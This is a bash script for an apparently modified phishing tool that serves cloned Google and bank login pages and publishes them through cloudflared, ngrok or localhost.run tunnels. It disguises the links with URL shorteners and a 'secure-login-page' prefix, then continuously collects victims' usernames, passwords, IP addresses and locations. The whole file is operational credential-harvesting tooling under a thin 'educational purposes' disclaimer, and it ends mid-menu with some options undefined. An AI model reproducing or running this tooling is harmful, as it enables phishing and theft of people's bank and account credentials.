#!/bin/bash


#
#  Copyright (c) 2022 Barchampas Gerasimos <makindosxx@gmail.com>.
#  mip22 is a advanced phishing tool.
#
#  mip22 is free software: you can redistribute it and/or modify
#  it under the terms of the GNU Affero General Public License as published by
#  the Free Software Foundation, either version 3 of the License, or
#  (at your option) any later version.
#
#  mip22 is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU Affero General Public License for more details.
#
#  You should have received a copy of the GNU Affero General Public License
#  along with this program.  If not, see <http://www.gnu.org/licenses>.
#
#


#permissions

chmod -R 777 packages.sh
chmod -R 777 tunnels.sh
chmod -R 777 host
chmod -R 777 offline
chmod -R 777 logs
chmod -R 777 online



#Install packages and tunnels

check_os_and_install_packages() {
	

if [[ -f host/cloudflared ]]; then

{ clear; }	

else

{ clear; header; }

OS_SYSTEM=$(uname -o)	
if [ $OS_SYSTEM != Android ]; then
     bash packages.sh
     bash tunnels.sh

else	
 ./packages.sh
 ./tunnels.sh
 	
fi	

fi
	
}


# Check os for root

check_root_and_os() {
	
OS_SYSTEM=$(uname -o)

if [ $OS_SYSTEM != Android ]; then


if [[ "${EUID:-$(id -u)}" -ne 0 ]]; then
    { clear; header; }
    echo -e "The program cannot run.\nFor run program in GNU/Linux Operating System,\nGive root privileges and try again. \n"
    exit 1
fi

fi


}



# Terminal Colors

RED="$(printf '\033[31m')"  
GREEN="$(printf '\033[32m')"  
ORANGE="$(printf '\033[33m')"  
BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  
CYAN="$(printf '\033[36m')"  
WHITE="$(printf '\033[37m')" 
BLACK="$(printf '\033[30m')"

ORANGEBG="$(printf '\033[43m')"  
BLUEBG="$(printf '\033[44m')"
RESETFG="$(printf '\e033[0m')"
RESETBG="$(printf '\e[0m\n')"



# Directories
if [[ ! -d "host" ]]; then
	mkdir -p "host"
fi

if [[ ! -d "online" ]]; then
	mkdir -p "online"
fi



# Clear content of log files

truncate -s 0 logs/.cloudfl.log 

truncate -s 0 logs/.localrun.log 




pid_kill() {
	
#kill all pid for php, ngrok and cloudflared
	if [[ `pidof php` ]]; then
		killall php > /dev/null 2>&1
	fi
	if [[ `pidof ngrok` ]]; then
		killall ngrok > /dev/null 2>&1
	fi
	if [[ `pidof cloudflared` ]]; then
		killall cloudflared > /dev/null 2>&1
	fi

}


header(){
	
    printf "${BLUE}"	
	cat <<- EOF
	
${ORANGEBG}${RED}  RANDOM RYAN WILL NOT BE HELD RESPONSIBLE $RESETBG                                                                                 
${WHITE}  █████████  █████  ${RED}██████ ${WHITE}  █████  ██  ██ 
${WHITE}    ██      ██   ██ ${RED}██   ██${WHITE} ██   ██ ██  ██ 
${WHITE}    ███████ ██ █ ██ ${RED}█████  ${WHITE} ██ █ ██ ██████ 
${WHITE}         ██ ██   ██ ${RED}██   ██${WHITE} ██   ██ ██  ██
${WHITE}  █████████ ██ ${GREEN}NO${RED}-${GREEN}IM${RED}-${GREEN}NOT${RED}-${GREEN}ANOTHER${RED}-${GREEN}AI${RED}-${GREEN}BOT${WHITE} ██  
${WHITE}   
${ORANGEBG}${RED}  FOR ANY WRONGFUL USE OF THE PROGRAM!!!!  $RESETBG     
	EOF

	
}



log_info(){
	
	bold=$(tput bold)
    normal=$(tput sgr0)
	
    printf "${GREEN}"	
	cat <<- EOF

$bold                            _       _                
$bold  |   _   _  o ._    o ._ _|_ _    |_ _      ._   _| 
$bold  |_ (_) (_| | | |   | | | | (_)   | (_) |_| | | (_| 
$bold          _|                                     


	EOF

	printf "${RESETBG}"	
}



# Php webserver and port 
host='127.0.0.1'
port='8080'


setup_clone(){
	
    # Setup cloned page and server
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${BLUE} Setting up cloned page..."${WHITE}
	rm -rf online/*
	cp -rf offline/"$site"/* online
	echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${BLUE} Starting your php server..."${WHITE}
	cd online && php -S "$host":"$port" > /dev/null 2>&1 & 
}



setup_clone_manual() {

   rm -rf online/*
   
   cp -rf .manual_attack/index.html online
   cp -rf .manual_attack/post.php online
   cp -rf .manual_attack/__ROOT__/index.php online
   cp -rf .manual_attack/__ROOT__/fingerprints.php online	
   
   
   rm -rf .manual_attack/index.html
   rm -rf .manual_attack/post.php
   rm -rf .manual_attack/data.txt
   	
   echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${BLUE} Starting your php server..."${WHITE}
   cd online && php -S "$host":"$port" > /dev/null 2>&1 & 	
}



setup_clone_customize(){
	
    # Setup cloned page and server
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${BLUE} Setting up cloned page..."${WHITE}
	rm -rf online/*
	cp -rf .customize/"$site"/* online
	echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${BLUE} Starting your php server..."${WHITE}
	cd online && php -S "$host":"$port" > /dev/null 2>&1 & 
}




## Get IP address
get_fingerprints() {
	IP=$(grep -a 'IP:.*' online/fingerprints.txt | cut -d " " -f2 | tr -d '\r')
    Full_Date=$(grep -a 'Full-Date:.*' online/fingerprints.txt | cut -d " " -f2 | tr -d '\r')
    Country=$(grep -a 'Country:.*' online/fingerprints.txt | cut -d " " -f2 | tr -d '\r')
    Region=$(grep -a 'Region:.*' online/fingerprints.txt | cut -d " " -f2 | tr -d '\r')
    City=$(grep -a 'City:.*' online/fingerprints.txt | cut -d " " -f2 | tr -d '\r')
    User_Agent=$(grep -a 'User-Agent:.*' online/fingerprints.txt | cut -d " " -f2 | tr -d '\r')
    OS_System=$(grep -a 'OS-System:.*' online/fingerprints.txt | cut -d " " -f2 | tr -d '\r')
	IFS=$'\n'	
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Victim Fingerprints.. "
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} IP: ${BLUE}$IP"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Full Date: ${BLUE}$Full_Date"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Country: ${BLUE}$Country"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Region: ${BLUE}$Region"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} City: ${BLUE}$City"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} User-Agent: ${BLUE}$User_Agent"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} OS System: ${BLUE}$OS_System"
	echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${BLUE} Saved in : ${MAGENTA}fingerprints.txt"
	cat online/fingerprints.txt >> fingerprints.txt
}


# Get credentials from victims
get_creds() {
	ACC=$(grep -o 'Username:.*' online/data.txt | cut -d " " -f2)
	PASS=$(grep -o 'Password:.*' online/data.txt | cut -d ":" -f2)
	IFS=$'\n'
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Account : ${WHITE}$ACC"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Password : ${WHITE}$PASS"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Saved in : ${ORANGE}data.txt"
	cat online/data.txt >> data.txt
	echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Waiting for Next Fingerptints and Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
}




# Get credentials from victims manual method
get_creds_manual() {
	ACC=$(tail -n 20 online/data.txt)	
	IFS=$'\n'
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Account : ${WHITE}$ACC"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Saved in : ${ORANGE}data.txt"
	cat online/data.txt >> data.txt
	echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
}






# Print credentials from victim
credentials() {
	
   echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Waiting for Victim fingerprints and Login Info.. ${BLUE}Ctrl + C ${MAGENTA}to exit..."
	
	while true; do
	
		if [[ -e "online/fingerprints.txt" ]]; then
			echo -e "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Fingerprints Victim Found!"
			get_fingerprints
			rm -rf online/fingerprints.txt
		fi
		
		sleep 0.75
		
		if [[ -e "online/data.txt" ]]; then
		    notice_login
		    echo -e "\n"
		    log_info
		    #echo -e "\n\n \033[31;5;7m Login info Found! \033[37m"
		    #echo -e "${RESETBG}"
			get_creds
			rm -rf online/data.txt
		fi
		
		sleep 0.75
		
	done
}




# Print credentials from victim manual
credentials_manual() {
	
  echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Waiting for Victim fingerprints and Login Info.. ${BLUE}Ctrl + C ${MAGENTA}to exit..."
	
   while true; do	
   
       if [[ -e "online/fingerprints.txt" ]]; then
			echo -e "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Fingerprints Victim Found!"
			get_fingerprints
			rm -rf online/fingerprints.txt
		fi
		
		sleep 0.75
   
		if [[ -e "online/data.txt" ]]; then
			notice_login
		    echo -e "\n"
		    log_info
		    #echo -e "\n\n \033[31;5;7m Login info Found! \033[37m"
		    #echo -e "${RESETBG}"
			get_creds_manual
			rm -rf online/data.txt
		fi
		
		sleep 0.75
		
	done
}






# Localhost Start
localhost_start() {
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${GREEN}( ${CYAN}http://$host:$port ${GREEN})"
	setup_clone
	{ sleep 1; clear; header; }
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Successfully Hosted in : ${GREEN}${CYAN}http://$host:$port ${GREEN}"
	credentials
}



# Localhost Start customize
localhost_customize() {
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${GREEN}( ${CYAN}http://$host:$port ${GREEN})"
	setup_clone_customize
	{ sleep 1; clear; header; }
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Successfully Hosted in : ${GREEN}${CYAN}http://$host:$port ${GREEN}"
	credentials
}



# Localhost Start manual
localhost_start_manual() {
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${GREEN}( ${CYAN}http://$host:$port ${GREEN})"
	setup_clone_manual
	{ sleep 1; clear; header; }
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Successfully Hosted in : ${GREEN}${CYAN}http://$host:$port ${GREEN}"
	credentials_manual
}




#ngrok token setup
ngrok_setup_token() {
	
{ clear; header; echo; }

	cat <<- EOF
		${GREEN}[${WHITE}1${GREEN}]${CYAN} Ngrok Toekn
		${GREEN}[${WHITE}99${GREEN}]${CYAN} Main Menu
		
		
	EOF
	
	
	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select Api : ${WHITE}"${WHITE}

	case $REPLY in 
	    
	    1) 
	        echo "Please insert yout ngrok authtoken (only key):"
	        read authtoken
	        
	         if [[ `command -v termux-chroot` ]]; then
              termux-chroot ./host/ngrok authtoken $authtoken 
              sleep 2 && menu
              
             else
                ./host/ngrok authtoken $authtoken 
                sleep 2 && menu
             fi ;;	 			
	    
	    
	    99) menu;;
		
		
	    *)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 0.7; ngrok_setup_token;};;
	  
	esac


}






apis() {
 
 { clear; header; echo; }

    cat <<- EOF
		${GREEN}[${WHITE}1${GREEN}]${CYAN} Ngrok
		${GREEN}[${WHITE}99${GREEN}]${CYAN} Main Menu
		
		
	EOF
	
	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select Api : ${WHITE}"${WHITE}

	case $REPLY in 
	    
        1) ngrok_setup_token;; 
	      			
	    99) menu;;
		
	    *)
		    echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Api, Try Again..."
			{ sleep 0.7; apis;};;
	  
	esac
	
}	






# Start ngrok
ngrok_start() {
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${MAGENTA}( ${CYAN}http://$host:$port ${MAGENTA})"
	{ sleep 1; setup_clone; }
	echo -ne "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Launching Ngrok..."

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ./host/ngrok http "$host":"$port" > /dev/null 2>&1 &
    else
        sleep 2 && ./host/ngrok http "$host":"$port" > /dev/null 2>&1 &
    fi

	{ sleep 9; clear; header; }
	
	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
	ngrok_url1=${ngrok_url#https://}
	
    url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$ngrok_url1")
	
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http : ${GREEN}http://$ngrok_url1"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http(s) : ${GREEN}$ngrok_url"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL subdomain : ${GREEN}$subdomain@$ngrok_url1"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL shortener : ${GREEN}$url_short"
	
	credentials
}





# Start ngrok customize
ngrok_start_customize() {
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${MAGENTA}( ${CYAN}http://$host:$port ${MAGENTA})"
	{ sleep 1; setup_clone_customize; }
	echo -ne "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Launching Ngrok..."

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ./host/ngrok http "$host":"$port" > /dev/null 2>&1 &
    else
        sleep 2 && ./host/ngrok http "$host":"$port" > /dev/null 2>&1 &
    fi

	{ sleep 9; clear; header; }
	
	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
	ngrok_url1=${ngrok_url#https://}
	
    url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$ngrok_url1")
	
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http : ${GREEN}http://$ngrok_url1"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http(s) : ${GREEN}$ngrok_url"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL subdomain : ${GREEN}$subdomain@$ngrok_url1"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL shortener : ${GREEN}$url_short"
	
	credentials
}





# Start ngrok manual
ngrok_start_manual() {
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${MAGENTA}( ${CYAN}http://$host:$port ${MAGENTA})"
	{ sleep 1; setup_clone_manual; }
	echo -ne "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Launching Ngrok..."

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ./host/ngrok http "$host":"$port" > /dev/null 2>&1 &
    else
        sleep 2 && ./host/ngrok http "$host":"$port" > /dev/null 2>&1 &
    fi

	{ sleep 9; clear; header; }
	
	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
	ngrok_url1=${ngrok_url#https://}
	
	url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$ngrok_url1")
	
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http : ${GREEN}http://$ngrok_url1"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http(s) : ${GREEN}$ngrok_url"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL subdomain : ${GREEN}$subdomain@$ngrok_url1"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL shortener : ${GREEN}$url_short"
	
	credentials_manual
}




# Start Cloudflared
cloudflared_start() { 
	
	echo -e ""
	{ sleep 1; setup_clone; }
	echo -ne "${MAGETNA}"

    if [[ `command -v termux-chroot` ]]; then
		sleep 2 && termux-chroot ./host/cloudflared tunnel -url "$host":"$port" > logs/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
    else
        sleep 2 && ./host/cloudflared tunnel -url "$host":"$port" > logs/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
    fi

	{ sleep 12; clear; header; }
cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "logs/.cloudfl.log")
url_="${cldflr_url}/public/deposit/submit1.php"
url_0="${cldflr_url}/swift.php"
url_1="${cldflr_url}/public/deposit/manual.php"

url0=$(curl -s 'https://is.gd/create.php?format=simple&url='"$url_0")
url1=$(curl -s 'https://is.gd/create.php?format=simple&url='"$url_1")
URL_=$(curl -s 'https://is.gd/create.php?format=simple&url='"$url1_")
echo -e "${RED}=================================================="
echo -e "${WHITE} BB AUTOMATIC       $url0    "
echo -e "${RED}=================================================="
echo -e "${WHITE} BB  MANUAL    --  $url   "
echo -e "${RED}===================-============================"
echo -e "${WHITE} GB GOOGLE SW      $url1    "


${ORANGEBG}
}


# Start Cloudflared customize
cloudflared_start_customize() { 
	
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${MAGENTA}( ${CYAN}http://$host:$port ${GREEN})"
	{ sleep 1; setup_clone_customize; }
	echo -ne "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGETNA} Launching Cloudflared..."

    if [[ `command -v termux-chroot` ]]; then
		sleep 2 && termux-chroot ./host/cloudflared tunnel -url "$host":"$port" > logs/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
    else
        sleep 2 && ./host/cloudflared tunnel -url "$host":"$port" > logs/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
    fi

	{ sleep 12; clear; header; }
	
	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "logs/.cloudfl.log")
	cldflr_url1=${cldflr_url#https://}
	
	url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$cldflr_url1")
	
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http : ${GREEN}http://$cldflr_url1"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http(s) : ${GREEN}$cldflr_url"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL subdomain : ${GREEN}$subdomain@$cldflr_url1"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL shortener : ${GREEN}$url_short"
	
	credentials
}





# Start Cloudflared manual
cloudflared_start_manual() { 
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${MAGENTA}( ${CYAN}http://$host:$port ${GREEN})"
	{ sleep 1; setup_clone_manual; }
	echo -ne "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Launching Cloudflared..."

    if [[ `command -v termux-chroot` ]]; then
		sleep 2 && termux-chroot ./host/cloudflared tunnel -url "$host":"$port" > logs/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
    else
        sleep 2 && ./host/cloudflared tunnel -url "$host":"$port" > logs/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
    fi

	{ sleep 12; clear; header; }
	
	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "logs/.cloudfl.log")
	cldflr_url1=${cldflr_url#https://}
	
	url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$cldflr_url1")
	
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http : ${GREEN}http://$cldflr_url1"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http(s) : ${GREEN}$cldflr_url"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL subdomain : ${GREEN}$subdomain@$cldflr_url1"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL shortener : ${GREEN}$url_short"
	
	credentials_manual
}






# Start localrun
localhostrun_start() {
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${MAGENTA}( ${CYAN}http://$host:$port ${MAGENTA})"
	{ sleep 1; setup_clone; }
	echo -ne "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Launching LocalhostRun..."

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ssh -R "80":"$host":"$port" "nokey@localhost.run" > logs/.localrun.log  2>&1 & > /dev/null 2>&1 &
    else
        sleep 2 && ssh -R "80":"$host":"$port" "nokey@localhost.run" > logs/.localrun.log  2>&1 & > /dev/null 2>&1 &
    fi

	{ sleep 9; clear; header; }
	
	localrun_url=$(grep -o 'https://[-0-9a-z]*\.lhrtunnel.link' "logs/.localrun.log")
	localrun_url1=${localrun_url#https://}
	
	url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$localrun_url1")
	
    echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http : ${GREEN}http://$localrun_url1"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL https(s) : ${GREEN}$localrun_url"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL subdomain : ${GREEN}$subdomain@$localrun_url1"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL shortener : ${GREEN}$url_short"
	
	credentials
}




# Start localrun customize
localhostrun_start_customize() {
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${MAGENTA}( ${CYAN}http://$host:$port ${MAGENTA})"
	{ sleep 1; setup_clone_customize; }
	echo -ne "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Launching LocalhostRun..."

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ssh -R "80":"$host":"$port" "nokey@localhost.run" > logs/.localrun.log  2>&1 & > /dev/null 2>&1 &
    else
        sleep 2 && ssh -R "80":"$host":"$port" "nokey@localhost.run" > logs/.localrun.log  2>&1 & > /dev/null 2>&1 &
    fi

	{ sleep 9; clear; header; }
	
	localrun_url=$(grep -o 'https://[-0-9a-z]*\.lhrtunnel.link' "logs/.localrun.log")
	localrun_url1=${localrun_url#https://}
	
	url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$localrun_url1")
	
    echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http : ${GREEN}http://$localrun_url1"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL https(s) : ${GREEN}$localrun_url"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL subdomain : ${GREEN}$subdomain@$localrun_url1"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL shortener : ${GREEN}$url_short"
	
	credentials
}




# Start localrun manual
localhostrun_start_manual() {
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${MAGENTA}( ${CYAN}http://$host:$port ${MAGENTA})"
	{ sleep 1; setup_clone_manual; }
	echo -ne "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Launching LocalhostRun..."

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ssh -R "80":"$host":"$port" "nokey@localhost.run" > logs/.localrun.log  2>&1 & > /dev/null 2>&1 &
    else
        sleep 2 && ssh -R "80":"$host":"$port" "nokey@localhost.run" > logs/.localrun.log  2>&1 & > /dev/null 2>&1 &
    fi

	{ sleep 9; clear; header; }
	
	localrun_url=$(grep -o 'https://[-0-9a-z]*\.lhrtunnel.link' "logs/.localrun.log")
	localrun_url1=${localrun_url#https://}
	
	url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$localrun_url1")
	
    echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http : ${GREEN}http://$localrun_url1"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL https(s) : ${GREEN}$localrun_url"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL subdomain : ${GREEN}$subdomain@$localrun_url1"
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL shortener : ${GREEN}$url_short"
	
	credentials_manual
}






# Select Tunnel  
tunnel() {
	{ clear; header; }
	cat <<- EOF

		${GREEN}[${WHITE}1${GREEN}]${CYAN} Localhost ${MAGENTA} (for practise only)
		${GREEN}[${WHITE}2${GREEN}]${CYAN} LocalhostRun ${MAGENTA} (alternative)  
		${GREEN}[${WHITE}3${GREEN}]${CYAN} Cloudflared ${MAGENTA} (recommended)
		${GREEN}[${WHITE}4${GREEN}]${CYAN} Ngrok ${MAGENTA} (first install token from menu)

	EOF

	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select a port forwarding service : ${WHITE}"

	case $REPLY in 
		   1)
		    localhost_start;;
		    
		   2)
		    localhostrun_start;; 

			
		   4)
			ngrok_start;;
		   	
			
		  *)
			echo -ne "\n${GREEN}[${WHITE}!${GREEN}]${RED} Invalid Option, Try Again..."
			{ sleep 1; header; tunnel;};;
	esac

}






# Select Tunnel customize 
tunnel_customize() {
	{ clear; header; }
	cat <<- EOF

		${GREEN}[${WHITE}1${GREEN}]${CYAN} Localhost ${MAGENTA} (for practise only)
		${GREEN}[${WHITE}2${GREEN}]${CYAN} LocalhostRun ${MAGENTA} (alternative)  
		${GREEN}[${WHITE}3${GREEN}]${CYAN} Cloudflared ${MAGENTA} (recommended)
		${GREEN}[${WHITE}4${GREEN}]${CYAN} Ngrok ${MAGENTA} (first install token from menu)

	EOF

	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select a port forwarding service : ${WHITE}"

	case $REPLY in 
		   1)
		    localhost_start_customize;;
		    
		   2)
		    localhostrun_start_customize;; 
			
		   3)
			cloudflared_start_customize;;
			
		   4)
			ngrok_start_customize;;
		   	
			
		  *)
			echo -ne "\n${GREEN}[${WHITE}!${GREEN}]${RED} Invalid Option, Try Again..."
			{ sleep 1; header; tunnel_customize;};;
	esac

}








start_manual_method() {
 
 cd .manual_attack && php -S "127.0.0.1:8081" > /dev/null 2>&1 & 
     echo -e "\n${GREEN}[${WHITE}-${GREEN}] ${GREEN} Visit ${WHITE} http://127.0.0.1:8081 ${GREEN} for setup clone page "${WHITE}
	 echo -e "\n${GREEN}[${WHITE}-${GREEN}] ${GREEN} After setup clone page return to here and continue... "${WHITE}

}


# Select Tunnel  
tunnel_manual() {
	{ clear; header; }
	 
	
	 start_manual_method
	
	cat <<- EOF

		${GREEN}[${WHITE}1${GREEN}]${CYAN} Localhost ${MAGENTA} (for practise only)
		${GREEN}[${WHITE}2${GREEN}]${CYAN} LocalhostRun ${MAGENTA} (alternative)  
		${GREEN}[${WHITE}3${GREEN}]${CYAN} Cloudflared ${MAGENTA} (recommended)
		${GREEN}[${WHITE}4${GREEN}]${CYAN} Ngrok ${MAGENTA} (first install token from menu)    

	EOF

	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select a port forwarding service : ${WHITE}"

	case $REPLY in 
			
		   3)
			cloudflared_start_manual;;
			
		  *)
			echo -ne "\n${GREEN}[${WHITE}!${GREEN}]${RED} Invalid Option, Try Again..."
			{ sleep 1; header; tunnel_manual;};;
	esac

}


attack1() {
	clear
	header
	echo

	cat <<-EOF
		${GREEN}[${WHITE}1GS${GREEN}]${CYAN} STEVE'S GOOGLE BOT
		${GREEN}[${WHITE}1GR${GREEN}]${CYAN} SARAH'S GOOGLE BOT
		${GREEN}[${WHITE}1SR${GREEN}]${CYAN} [TEAM] SARAH & STEVE	    
	EOF
	
	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select an option: ${WHITE}" choice

	case $choice in
		1GS)
			site="/.BOTS/GOOGLE/1GS"
			cloudflared_start
			;;
		1GR)
			site="/.BOTS/GOOGLE/1GR"
			cloudflared_start
			;;
		1SR)
			site="/.BOTS/GOOGLE/team"
			cloudflared_start
			;;
		*)
			echo -e "\n${GREEN}[${WHITE}!${GREEN}]${RED} Invalid Option, Try Again..."
			sleep 0.7
			attack1
			;;
	esac
}

attack2() {
	clear
	header
	echo

	cat <<-EOF
		${GREEN}[${WHITE}1GS${GREEN}]${CYAN} STEVE'S GOOGLE BOT
		${GREEN}[${WHITE}1GR${GREEN}]${CYAN} SARAH'S GOOGLE BOT
		${GREEN}[${WHITE}1SR${GREEN}]${CYAN} [TEAM] SARAH & STEVE	    
	EOF
	
	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select an option: ${WHITE}" choice

	case $choice in
		 1GS)
			site="/.BOTS/.BANK/1GS"
			tunnel
			;;
		1GR)
			site="/.BOTS/.BANK/1GR"
			tunnel
			;;
		1SR)
			site="/.BOTS/.BANK/team"
			tunnel
			;;
		*)
			echo -e "\n${GREEN}[${WHITE}!${GREEN}]${RED} Invalid Option, Try Again..."
			sleep 0.7
			attack2
			;;
	esac
}

attack_manual() {
	subdomain='http:secure-login-page'
	tunnel_manual
}

menu() {
	clear
	header
	echo

	cat <<-EOF
		${GREEN}[${WHITE}GB${GREEN}]${CYAN} GOOGLE BOTS 
		${GREEN}[${WHITE}BB${GREEN}]${CYAN} BANK BOTS
		${GREEN}[${WHITE}SP${GREEN}]${CYAN} SCAM PAGES 
	EOF

	read -p "${ORANGEBG}${RED} FOR EDUCATIONAL PURPOSES ONLY! [SELECT]  $RESETBG ${WHITE}" choice

	case $choice in 
		GB)
			attack1
			;;
		BB)
			attack2
			;;
		SP)
			attack3
			;;
		0)
